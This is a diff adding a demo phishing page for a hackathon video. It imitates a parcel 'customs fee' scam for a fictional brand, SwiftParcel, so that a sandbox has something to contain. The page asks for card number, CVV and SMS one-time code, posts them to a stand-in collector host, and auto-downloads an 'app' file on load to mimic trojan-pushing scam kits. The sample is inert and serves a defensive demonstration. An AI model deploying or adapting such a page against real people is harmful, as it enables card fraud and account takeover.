@@ -1,0 +1,58 @@
+<!doctype html>
+<!--
+  HARMLESS DEMO PAGE for the Phish Out of Water hackathon video.
+  "SwiftParcel" is a fictional brand. The form submits nowhere real and the .apk is a text file.
+  It imitates the shape of a real "customs fee" SMS scam so the sandbox has something to contain.
+-->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SwiftParcel – Delivery on hold</title>
+  <style>
+    body { margin: 0; font-family: system-ui, sans-serif; background: #f3f4f6; color: #111; }
+    header { background: #ffcc00; padding: 14px 18px; font-weight: 800; font-size: 1.3rem; letter-spacing: -0.02em; }
+    header span { color: #c8102e; }
+    main { padding: 18px; max-width: 420px; margin: 0 auto; }
+    .alert { background: #fff; border-left: 4px solid #c8102e; padding: 12px 14px; border-radius: 6px; margin-bottom: 16px; }
+    .alert strong { color: #c8102e; }
+    label { display: block; font-size: 0.85rem; margin: 10px 0 4px; color: #444; }
+    input { width: 100%; box-sizing: border-box; padding: 11px; border: 1px solid #ccc; border-radius: 6px; font-size: 1rem; }
+    .row { display: flex; gap: 10px; } .row > div { flex: 1; }
+    button { width: 100%; margin-top: 16px; padding: 13px; background: #c8102e; color: #fff; border: 0; border-radius: 6px; font-size: 1rem; font-weight: 700; }
+    small { display: block; color: #777; margin-top: 14px; text-align: center; }
+  </style>
+</head>
+<body>
+  <header>Swift<span>Parcel</span></header>
+  <main>
+    <div class="alert">
+      <strong>Your package is on hold.</strong><br>
+      A customs fee of <b>$1.99</b> is pending. Pay within 24h or your parcel will be returned to sender.
+    </div>
+    <p>Tracking number: <b>SP-48213-US</b></p>
+    <form action="https://payments-collector.invalid/submit" method="post">
+      <label for="card-number">Card number</label>
+      <input id="card-number" name="card_number" autocomplete="cc-number" placeholder="1234 5678 9012 3456">
+      <div class="row">
+        <div><label for="card-expiry">Expiry</label><input id="card-expiry" name="expiry" autocomplete="cc-exp" placeholder="MM/YY"></div>
+        <div><label for="card-cvv">CVV</label><input id="card-cvv" name="cvv" autocomplete="cc-csc" placeholder="123"></div>
+      </div>
+      <label for="sms-code">SMS verification code</label>
+      <input id="sms-code" name="otp" autocomplete="one-time-code" placeholder="6 digits">
+      <button type="button">Pay $1.99 and release my parcel</button>
+    </form>
+    <small>Install the SwiftParcel app to track your delivery in real time.</small>
+  </main>
+  <script>
+    // Mimics scam kits that push an "official app" (a remote-access trojan) as soon as the page loads.
+    setTimeout(() => {
+      const link = document.createElement('a');
+      link.href = 'SwiftParcel-Tracker.apk';
+      link.download = 'SwiftParcel-Tracker.apk';
+      document.body.append(link);
+      link.click();
+    }, 1200);
+  </script>
+</body>
+</html>
